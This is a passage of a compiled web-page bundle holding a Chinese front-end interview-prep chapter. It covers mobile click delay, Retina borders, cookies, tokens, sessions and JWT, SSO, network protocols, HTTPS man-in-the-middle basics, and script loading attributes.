import{_ as p,M as o,p as c,q as l,R as n,t as a,N as t,a1 as e}from"./framework-e8cb8151.js";const i="/assets/nytimes-afaa1594.jpeg",u="/assets/border-1-fb4e96d5.png",r="/assets/border-2-397c56f0.png",d="/assets/cookie-6632d7cb.png",k="/assets/token-d2cdd7d3.png",h="/assets/网络协议-1e0386ab.png",v="/assets/https-b184eaf2.png",m="/assets/中间人攻击-06d9b439.jpeg",g="/assets/https-错误-bf2442bd.png",b="/assets/async-defer-7b783e0c.png",f="/assets/点击劫持-d19a7af0.png",w="/assets/ws连接-92a31665.png",x="/assets/长轮询-7e3322a7.png",q="/assets/cache-control-116031b0.png",S="/assets/render-fef2d1ca.png",_="/assets/koa2-17761a27.png",y="/assets/koa2洋葱圈-b8dcbd09.png",j={},P=e('<h1 id="_06-知识广度-从前端到全栈" tabindex="-1"><a class="header-anchor" href="#_06-知识广度-从前端到全栈" aria-hidden="true">#</a> 06-知识广度 - 从前端到全栈</h1><h2 id="_01-章节介绍" tabindex="-1"><a class="header-anchor" href="#_01-章节介绍" aria-hidden="true">#</a> 01: 章节介绍</h2><h3 id="开始" tabindex="-1"><a class="header-anchor" href="#开始" aria-hidden="true">#</a> 开始</h3><p>前端工程师有很多，而是技能全面、独当一面的前端工程师到哪里都是“香饽饽”，企业争抢。所以，技术广度将决定你的稀缺性，以及未来的发展空间。本章将通过多个面试题，讲解前端面试常考的技术广度问题，涉及前端、移动端、服务端等全流程。</p><h3 id="为何要考察" tabindex="-1"><a class="header-anchor" href="#为何要考察" aria-hidden="true">#</a> 为何要考察</h3><p>现代前端工程师已经不单单是开发页面了，你可能需要去开发移动端、服务端。或者和他们有亲密的合作，你需要了解他们的运作流程。</p><p>企业想要招聘到一些全能型的工程师，能在工作中串通上下流程，而不是只做开发。</p><h3 id="考察重点" tabindex="-1"><a class="header-anchor" href="#考察重点" aria-hidden="true">#</a> 考察重点</h3><ul><li>移动端相关支持</li><li>HTTP 网路相关支持</li><li>Nodejs 相关支持</li></ul><h3 id="注意事项" tabindex="-1"><a class="header-anchor" href="#注意事项" aria-hidden="true">#</a> 注意事项</h3><ul><li>不会从 0 基础讲起，基础不熟悉的可以给我提问</li><li>广，则不能深</li></ul><h3 id="看几个问题" tabindex="-1"><a class="header-anchor" href="#看几个问题" aria-hidden="true">#</a> 看几个问题</h3><ul><li>HTTP 和 WebSocket 有什么区别</li><li>前端攻击的常用手段有哪些？如何预防</li><li>请描述 koa2 的洋葱模型</li></ul><h2 id="_02-移动端-h5-点击有-300ms-延迟-该如何解决" tabindex="-1"><a class="header-anchor" href="#_02-移动端-h5-点击有-300ms-延迟-该如何解决" aria-hidden="true">#</a> 02：移动端 H5 点击有 300ms 延迟，该如何解决</h2><h3 id="题目" tabindex="-1"><a class="header-anchor" href="#题目" aria-hidden="true">#</a> 题目</h3><p>移动端 click 300ms 延迟，如何解决</p><h3 id="背景" tabindex="-1"><a class="header-anchor" href="#背景" aria-hidden="true">#</a> 背景</h3><p>智能手机开始流行的前期，浏览器可以点击缩放（double tap to zoom）网页。这样在手机上就可以浏览 PC 网页，很酷炫。</p><p><img src="'+i+'" alt=""></p><p>浏览器为了分辨 click 还是“点击缩放”，就强行把 click 时间延迟 300ms 触发。</p><h3 id="初期解决方案" tabindex="-1"><a class="header-anchor" href="#初期解决方案" aria-hidden="true">#</a> 初期解决方案</h3>',21),T={href:"https://www.npmjs.com/package/fastclick",target:"_blank",rel:"noopener noreferrer"},C=e(`<div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// FastClick 使用非常简单</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>
  <span class="token string">&#39;load&#39;</span><span class="token punctuation">,</span>
  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    FastClick<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token boolean">false</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>它的内部原理是</p>`,2),W=n("li",null,[a("监听 "),n("code",null,"touchend"),a(" 事件 （"),n("code",null,"touchstart"),a(),n("code",null,"touchend"),a(" 会先于 "),n("code",null,"click"),a(" 事件被触发）")],-1),D={href:"https://developer.mozilla.org/zh-CN/docs/Web/API/CustomEvent",target:"_blank",rel:"noopener noreferrer"},E=n("li",null,"把 300ms 之后触发的 click 事件阻止掉",-1),I=e(`<h3 id="现代浏览器的改进" tabindex="-1"><a class="header-anchor" href="#现代浏览器的改进" aria-hidden="true">#</a> 现代浏览器的改进</h3><p>随着近几年移动端响应式的大力发展，移动端网页和 PC 网页有不同的设计，不用再缩放查看。</p><p>这 300ms 的延迟就多余了，现代浏览器可以通过禁止缩放来取消这 300ms 的延迟。</p><ul><li>Chrome 32+ on Android</li><li>iOS 9.3</li></ul><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="答案" tabindex="-1"><a class="header-anchor" href="#答案" aria-hidden="true">#</a> 答案</h3><ul><li>原因：点击缩放（double tap to zoom）网页</li><li>可使用 FastClick 解决</li><li>现代浏览器可使用 <code>width=device-width</code> 规避</li></ul><h2 id="_03-扩展-retina-屏幕的-1px-像素-如何实现" tabindex="-1"><a class="header-anchor" href="#_03-扩展-retina-屏幕的-1px-像素-如何实现" aria-hidden="true">#</a> 03:扩展：Retina 屏幕的 1px 像素，如何实现</h2><h3 id="题目-1" tabindex="-1"><a class="header-anchor" href="#题目-1" aria-hidden="true">#</a> 题目</h3><p>Retina 屏 1px 像素问题，如何实现</p><h3 id="介绍" tabindex="-1"><a class="header-anchor" href="#介绍" aria-hidden="true">#</a> 介绍</h3><p>该问题通常用于考察你是否做过移动端 h5 项目。<br> 如果你能知道这个问题，并且答出来，知道前因后果，证明你有过 h5 开发经验。<br> 否则就说明你没有 h5 的任何开发经验，尤其是你如果都不知道这个事情，那就更加说明这一点。</p><h3 id="普通的-1px" tabindex="-1"><a class="header-anchor" href="#普通的-1px" aria-hidden="true">#</a> 普通的 <code>1px</code></h3><p>如果仅仅使用 css 的 <code>1px</code> 来设置 border ，那可能会出现比较粗的情况。<br> 因为，有些手机屏幕的 DPR = 2 ，即 <code>1px</code> 它会用两个物理像素来显示，就粗了。</p><div class="language-css line-numbers-mode" data-ext="css"><pre class="language-css"><code><span class="token selector">#box</span> <span class="token punctuation">{</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> 10px 0<span class="token punctuation">;</span>
  <span class="token property">border-bottom</span><span class="token punctuation">:</span> 1px solid #eee<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如下图，上面是微信 app 的 border ，下面是 <code>1px</code> 的 border ，有明显的区别。显得很粗糙，很不精致，设计师不会允许这样的页面发布上线的。</p><p><img src="`+u+`" alt=""></p><p>PS：你不能直接写 <code>0.5px</code> ，浏览器兼容性不好，渲染出来可能还是 <code>1px</code> 的效果。</p><h3 id="使用-transform-缩小" tabindex="-1"><a class="header-anchor" href="#使用-transform-缩小" aria-hidden="true">#</a> 使用 <code>transform</code> 缩小</h3><p>我们可以使用 css 伪类 + <code>transform</code> 来优化这一问题。即把默认的 <code>1px</code> 宽度给压缩 0.5 倍。</p><div class="language-css line-numbers-mode" data-ext="css"><pre class="language-css"><code><span class="token selector">#box</span> <span class="token punctuation">{</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> 10px 0<span class="token punctuation">;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">#box::before</span> <span class="token punctuation">{</span>
  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">bottom</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 1px<span class="token punctuation">;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> #d9d9d9<span class="token punctuation">;</span>
  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scaleY</span><span class="token punctuation">(</span>0.5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">transform-origin</span><span class="token punctuation">:</span> 0 0<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如下图，上面是微信 app 的 border ，下面是优化之后的 border ，两者粗细就一致了。</p><p><img src="`+r+`" alt=""></p><h3 id="连环问-如果有-border-radius-怎么办" tabindex="-1"><a class="header-anchor" href="#连环问-如果有-border-radius-怎么办" aria-hidden="true">#</a> 连环问：如果有 <code>border-radius</code> 怎么办</h3><p>可以使用 <code>box-shadow</code> 设置</p><ul><li>X 偏移量 <code>0</code></li><li>Y 偏移量 <code>0</code></li><li>阴影模糊半径 <code>0</code></li><li>阴影扩散半径 <code>0.5px</code></li><li>阴影颜色</li></ul><div class="language-css line-numbers-mode" data-ext="css"><pre class="language-css"><code><span class="token selector">#box2</span> <span class="token punctuation">{</span>
  <span class="token property">margin-top</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
  <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
  <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
  <span class="token comment">/* border: 1px solid #d9d9d9; */</span>
  <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 0 0 0.5px #d9d9d9<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_04-http-请求中-token-和-cookie-有什么区别-cookie-和-session" tabindex="-1"><a class="header-anchor" href="#_04-http-请求中-token-和-cookie-有什么区别-cookie-和-session" aria-hidden="true">#</a> 04: HTTP 请求中 token 和 cookie 有什么区别-cookie 和 session</h2><h3 id="题目-2" tabindex="-1"><a class="header-anchor" href="#题目-2" aria-hidden="true">#</a> 题目</h3><p>cookie 和 token 有何区别</p><h3 id="cookie" tabindex="-1"><a class="header-anchor" href="#cookie" aria-hidden="true">#</a> cookie</h3><ul><li>http 请求是无状态的，即每次请求之后都会断开链接。</li><li>所以，每次请求时，都可以携带一段信息发送到服务端，以表明客户端的用户身份。</li><li>服务端也也可以通过 <code>set-cookie</code> 向客户端设置 cookie 内容。</li><li>由于每次请求都携带 cookie ，所以 cookie 大小限制 4kb 以内。</li><li>默认有跨域限制：不可跨域共享、传递 Cookie</li></ul><p><img src="`+d+'" alt=""></p><h3 id="cookie-作为本地存储" tabindex="-1"><a class="header-anchor" href="#cookie-作为本地存储" aria-hidden="true">#</a> cookie 作为本地存储</h3><ul><li>前些年大家还常用 cookie 作为本地存储，这并不完全合适。</li><li>所以后来 html5 增加了 <code>localStorage</code> 和 <code>sessionStorage</code> 作为本地存储。</li></ul><h3 id="cookie-跨域限制" tabindex="-1"><a class="header-anchor" href="#cookie-跨域限制" aria-hidden="true">#</a> cookie 跨域限制</h3><p>浏览器存储 cookie 是按照域名区分的，在浏览器无法通过 JS <code>document.cookie</code> 获取到其他域名的 cookie 。</p><p>http 请求传递 cookie 默认有跨域限制。如果想要开启，需要客户端和服务器同时设置允许</p><ul><li>客户端：使用 fetch 和 XMLHttpRequest 或者 axios 需要配置 <code>withCredentials</code></li><li>服务端：需要配置 header <code>Access-Control-Allow-Credentials</code></li></ul><h3 id="现代浏览器禁用第三发-cookie" tabindex="-1"><a class="header-anchor" href="#现代浏览器禁用第三发-cookie" aria-hidden="true">#</a> 现代浏览器禁用第三发 cookie</h3><ul><li>和跨域限制不同，这里是：禁止网页引入的第三方 JS 设置 Cookie</li><li>打击第三方广告，保护用户个人隐私。</li><li>新增属性 SameSite: Strict/Lax/None 供用户自己选择</li></ul><p>例如一个电商网站 A 引用了淘宝广告的 js</p><ul><li>你访问 A 时，淘宝 js 设置 cookie ，记录下商品信息</li><li>你再次访问淘宝时，淘宝即可获取这个 cookie 内容</li><li>再和你的个人信息（也在 cookie 里）一起发送到服务端，这样就知道了你看了哪个商品</li></ul><h3 id="cookie-和-session" tabindex="-1"><a class="header-anchor" href="#cookie-和-session" aria-hidden="true">#</a> cookie 和 session</h3><ul><li>cookie 用于登录验证，存储用户标识（如 userId）</li><li>session 在服务端，存储用户详细信息，和 cookie 信息一一对应</li><li>cookie 和 session 是常见登录验证解决方案</li></ul><p>cookie 用途非常广泛，最常见的就是登录。</p><p>使用 cookie 做登录校验</p><ul><li>前端输入用户名密码，传给后端</li><li>后端验证成功，返回信息时 set-cookie</li><li>接下来所有接口访问，都自动带上 cookie （浏览器的默认行为， http 协议的规定）</li></ul><p>什么是 session ？</p><ul><li>cookie 只存储 userId ，不去暴露用户信息</li><li>用户信息存储在 session 中 —— session 就是服务端的一个 hash 表</li></ul><h3 id="token" tabindex="-1"><a class="header-anchor" href="#token" aria-hidden="true">#</a> token</h3><p>token 和 cookie 一样，也是一段用于客户端身份验证的字符串，随着 http 请求发送</p><ul><li>cookie 是 http 协议规范的，而 token 是自定义的，可以用任何方式传输（如 header body query-string 等）</li><li>token 默认不会在浏览器存储</li><li>token 没有跨域限制</li></ul><p>所以，token 很适合做跨域或者第三方的身份验证。</p><h3 id="token-和-jwt" tabindex="-1"><a class="header-anchor" href="#token-和-jwt" aria-hidden="true">#</a> token 和 JWT</h3><p>JWT === JSON Web Token</p><p>JWT 的过程</p><ul><li>前端输入用户名密码，传给后端</li><li>后端验证成功，返回一段 token 字符串 - 将用户信息加密之后得到的</li><li>前端获取 token 之后，存储下来</li><li>以后访问接口，都在 header 中带上这段 token</li></ul><p><img src="'+k+'" alt=""></p><h3 id="答案-1" tabindex="-1"><a class="header-anchor" href="#答案-1" aria-hidden="true">#</a> 答案</h3><ul><li>cookie：http 规范；有跨域限制；可存储在本地；可配合 session 实现登录</li><li>token：自定义标准；不在本地存储；无跨域限制；可用于 JWT 登录</li></ul><h3 id="划重点" tabindex="-1"><a class="header-anchor" href="#划重点" aria-hidden="true">#</a> 划重点</h3><ul><li>cookie 的知识点很多，对于 HTTP 也很重要</li><li>Session 存在的价值</li><li>token 和 cookie 要对比理解，否则容易混淆</li></ul><h3 id="连环问-session-和-jwt-比较-你更推荐哪个" tabindex="-1"><a class="header-anchor" href="#连环问-session-和-jwt-比较-你更推荐哪个" aria-hidden="true">#</a> 连环问：session 和 JWT 比较，你更推荐哪个？</h3><h4 id="session-优点" tabindex="-1"><a class="header-anchor" href="#session-优点" aria-hidden="true">#</a> Session 优点</h4><ul><li>原理简单，易于学习</li><li>用户信息存储在服务端，可以快速封禁某个登录的用户 —— 有这方强需求的人，一定选择 Session</li></ul><h4 id="session-的缺点" tabindex="-1"><a class="header-anchor" href="#session-的缺点" aria-hidden="true">#</a> Session 的缺点</h4><ul><li>占用服务端内存，有硬件成本</li><li>多进程、多服务器时，不好同步 —— 一般使用第三方 redis 存储 ，成本高</li><li>跨域传递 cookie ，需要特殊配置</li></ul><h4 id="jwt-的优点" tabindex="-1"><a class="header-anchor" href="#jwt-的优点" aria-hidden="true">#</a> JWT 的优点</h4><ul><li>不占用服务器内存</li><li>多进程、多服务器，不受影响</li><li>不受跨域限制</li></ul><h4 id="jwt-的缺点" tabindex="-1"><a class="header-anchor" href="#jwt-的缺点" aria-hidden="true">#</a> JWT 的缺点</h4><ul><li>无法快速封禁登录的用户（用户信息存储在客户端）</li><li>万一服务端秘钥被泄露，则用户信息全部丢失</li><li>token 信息一般大于 cookie, 会增加请求的数据量</li></ul><h4 id="答案-2" tabindex="-1"><a class="header-anchor" href="#答案-2" aria-hidden="true">#</a> 答案</h4><ul><li>如果严格管理用户信息的需求（保密、快速封禁等）推荐 session</li><li>如果没有特殊要求，则推荐 JWT(如创业初期的网站)</li></ul><h3 id="连环问-如何实现-sso-单点登录" tabindex="-1"><a class="header-anchor" href="#连环问-如何实现-sso-单点登录" aria-hidden="true">#</a> 连环问：如何实现 SSO 单点登录</h3><h4 id="基于-cookie" tabindex="-1"><a class="header-anchor" href="#基于-cookie" aria-hidden="true">#</a> 基于 cookie</h4><ul><li>cookie 默认是跨域不共享，但是有些情况下可以设置为共享</li><li>主域名相同下，可以设置为共享。如 <code>wenku.baidu.com</code> <code>tieba.baidu.com</code></li><li>设置 cookie domain 设置为主域名，即可共享 cookie</li></ul><p>简单的，如果业务系统都在同一主域名下，比如 <code>wenku.baidu.com</code> <code>tieba.baidu.com</code> ，就好办了。 可以直接把 cookie domain 设置为主域名 <code>baidu.com</code> ，百度也就是这么干的。</p><h4 id="sso" tabindex="-1"><a class="header-anchor" href="#sso" aria-hidden="true">#</a> SSO</h4>',79),O={href:"https://www.cnblogs.com/ywlaker/p/6113927.html",target:"_blank",rel:"noopener noreferrer"},A={href:"https://juejin.cn/post/7044328327762411534",target:"_blank",rel:"noopener noreferrer"},F=e('<ul><li>主域名不一样,则 cookie 无法共享</li><li>可以使用 SSO 技术</li></ul><p>复杂一点的，滴滴这么潮的公司，同时拥有 <code>didichuxing.com</code> <code>xiaojukeji.com</code> <code>didiglobal.com</code> 等域名，种 cookie 是完全绕不开的。需要使用 SSO 技术方案</p><p><img src="https://images2015.cnblogs.com/blog/797930/201612/797930-20161203152650974-276822362.png" alt=""></p><h4 id="oauth2" tabindex="-1"><a class="header-anchor" href="#oauth2" aria-hidden="true">#</a> OAuth2</h4>',4),J={href:"https://juejin.cn/post/6949929792502235149",target:"_blank",rel:"noopener noreferrer"},M={href:"https://tools.ietf.org/html/rfc6749",target:"_blank",rel:"noopener noreferrer"},U=e('<h3 id="答案-3" tabindex="-1"><a class="header-anchor" href="#答案-3" aria-hidden="true">#</a> 答案</h3><ul><li>主域名相同，则课共享 cookie</li><li>主域名不同，则需要使用 SSO</li></ul><h2 id="_05-http-协议和-udp-协议有什么区别" tabindex="-1"><a class="header-anchor" href="#_05-http-协议和-udp-协议有什么区别" aria-hidden="true">#</a> 05: HTTP 协议和 UDP 协议有什么区别</h2><h3 id="题目-3" tabindex="-1"><a class="header-anchor" href="#题目-3" aria-hidden="true">#</a> 题目</h3><p>HTTP 和 UDP 有何区别</p><h3 id="网络协议" tabindex="-1"><a class="header-anchor" href="#网络协议" aria-hidden="true">#</a> 网络协议</h3><p><img src="'+h+'" alt=""></p><ul><li>HTTP 协议在应用层，直接被程序使用</li><li>TCP 和 UDP 在传输层，底层</li><li>严格来说，应该拿 TCP 和 UDP 进行比较</li></ul><h3 id="tcp-协议" tabindex="-1"><a class="header-anchor" href="#tcp-协议" aria-hidden="true">#</a> TCP 协议</h3><ul><li>有链接(三次握手)</li><li>有断开(四次挥手)</li><li>稳定传输</li></ul><h3 id="udp-协议" tabindex="-1"><a class="header-anchor" href="#udp-协议" aria-hidden="true">#</a> UDP 协议</h3><ul><li>无连接，无断开</li><li>不稳定传输，但是效率高</li><li>如：视频会议、语音通话</li></ul><p>UDP 是一种无连接的、不可靠的传输层协议。而 TCP 需要连接、断开连接，参考“三次握手、四次挥手”。</p><p>不需要连接，所以 UDP 的效率比 TCP 高。</p><p>虽然 UDP 从协议层是不稳定的，但随着现代网络硬件环境的提升，也能保证绝大部分情况下的稳定性。所以，UDP 一直处于被发展的趋势。</p><p>例如视频会议、语音通话这些允许中段、不完全保证持续连接的场景，又需要较高的传输效率，就很适合 UDP 协议。</p><h3 id="答案-4" tabindex="-1"><a class="header-anchor" href="#答案-4" aria-hidden="true">#</a> 答案</h3><ul><li>HTTP 在应用层，而 UDP 和 TCP 在传输层</li><li>HTTP 是有连接、有断开的，稳定传输</li><li>UDP 是无连接、无断开的，不稳定传输，但是效率高</li></ul><h2 id="_06-连环问-http-协议-1-0-1-1-2-0-区别" tabindex="-1"><a class="header-anchor" href="#_06-连环问-http-协议-1-0-1-1-2-0-区别" aria-hidden="true">#</a> 06: 连环问：http 协议 1.0 1.1 2.0 区别</h2><h3 id="http-1-0" tabindex="-1"><a class="header-anchor" href="#http-1-0" aria-hidden="true">#</a> http 1.0</h3><ul><li>最基础的 http 协议</li><li>支持基本的 GET POST 方法</li></ul><h3 id="http-1-1" tabindex="-1"><a class="header-anchor" href="#http-1-1" aria-hidden="true">#</a> http 1.1</h3><ul><li>引入更多的缓存策略，如 <code>cache-control</code> <code>E-tag</code></li><li>长链接，默认开启 <code>Connection: keep-alive</code> ，一次 TCP 连接多次 http 请求</li><li>断点续传，状态吗 <code>206</code></li><li>增加新的 method <code>PUT</code> <code>DELETE</code> 等，可用于 Restful API</li></ul><h3 id="http2-0" tabindex="-1"><a class="header-anchor" href="#http2-0" aria-hidden="true">#</a> http2.0</h3><ul><li>header 压缩，以减少体积</li><li>多路复用，一个 TCP 连接中可以多个 http 并行请求。拼接资源（如雪碧图、多 js 拼接一个）将变的多余</li><li>服务器端推送</li></ul><h3 id="http-3-0" tabindex="-1"><a class="header-anchor" href="#http-3-0" aria-hidden="true">#</a> HTTP 3.0</h3><ul><li>基于 google 的 QUIC 协议，而 quic 协议是使用 udp 实现的</li><li>减少了 tcp 三次握手时间，以及 tls 握手时间</li><li>解决了 http 2.0 中前一个 stream 丢包导致后一个 stream 被阻塞的问题</li><li>优化了重传策略，重传包和原包的编号不同，降低后续重传计算的消耗</li><li>连接迁移，不再用 tcp 四元组确定一个连接，而是用一个 64 位随机数来确定这个连接</li><li>更合适的流量控制</li></ul><h2 id="_07-什么是-https-中间人攻击-如何预防" tabindex="-1"><a class="header-anchor" href="#_07-什么是-https-中间人攻击-如何预防" aria-hidden="true">#</a> 07: 什么是 HTTPS 中间人攻击，如何预防</h2><h3 id="题目-4" tabindex="-1"><a class="header-anchor" href="#题目-4" aria-hidden="true">#</a> 题目</h3><p>什么是 https 中间人攻击，如何预防？</p><h3 id="复习-https-加密原理" tabindex="-1"><a class="header-anchor" href="#复习-https-加密原理" aria-hidden="true">#</a> 复习：https 加密原理</h3><p>http 是明文传输，传输的所有内容（如登录的用户名和密码），都会被中间的代理商（无论合法还是非法）获取到。</p><p>http + TLS/SSL = https ，即加密传输信息。只有客户端和服务端可以解密为明文，中间的过程无法解密。</p><p><img src="'+v+'" alt=""></p><h3 id="中间人攻击" tabindex="-1"><a class="header-anchor" href="#中间人攻击" aria-hidden="true">#</a> 中间人攻击</h3><p>中间人攻击，就是黑客劫持网络请求，伪造 CA 证书。</p><p><img src="'+m+'" alt=""></p><p>解决方案：使用浏览器可识别的，正规厂商的证书（如阿里云），慎用免费证书。</p><p><img src="'+g+'" alt=""></p><h3 id="划重点-1" tabindex="-1"><a class="header-anchor" href="#划重点-1" aria-hidden="true">#</a> 划重点</h3><ul><li>HTTPS 加密过程</li></ul><h2 id="_08-defer-和-async" tabindex="-1"><a class="header-anchor" href="#_08-defer-和-async" aria-hidden="true">#</a> 08: defer 和 async</h2><h3 id="题目-5" tabindex="-1"><a class="header-anchor" href="#题目-5" aria-hidden="true">#</a> 题目</h3><p><code>&lt;script&gt;</code> 的 defer 和 async 属性有何区别</p><h3 id="答案-5" tabindex="-1"><a class="header-anchor" href="#答案-5" aria-hidden="true">#</a> 答案</h3><ul><li><code>&lt;script src=&quot;xxx.js&quot;&gt;</code> 当解析到该标签时，会暂停 html 解析，并触发 js 下载、执行。然后再继续 html 解析。</li><li><code>&lt;script defer src=&quot;xxx.js&quot;&gt;</code> js 下载和 html 解析可并行。等待 html 解析完之后再执行 js 。</li><li><code>&lt;script async src=&quot;xxx.js&quot;&gt;</code> js 下载和 html 解析可并行，下载完之后暂停 html 解析，执行 js 。然后再继续 html 解析。</li></ul><p><img src="'+b+`" alt=""></p><h3 id="连环问-preload-prefetch-dns-prefetch-的区别" tabindex="-1"><a class="header-anchor" href="#连环问-preload-prefetch-dns-prefetch-的区别" aria-hidden="true">#</a> 连环问：preload prefetch dns-prefetch 的区别</h3><ul><li>preload 表示资源在当前页面使用，浏览器会<strong>优先</strong>加载</li><li>prefetch 表示资源可能在<strong>未来的页面</strong>（如通过链接打开下一个页面）使用，浏览器将在<strong>空闲时</strong>加载</li></ul><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>JS and CSS preload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>

  <span class="token comment">&lt;!-- preload --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preload<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style.css<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>preload<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>main.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>

  <span class="token comment">&lt;!-- prefetch --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>prefetch<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>other.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>

  <span class="token comment">&lt;!-- 引用 css --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>style.css<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>

  <span class="token comment">&lt;!-- 引用 js --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>main.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">defer</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
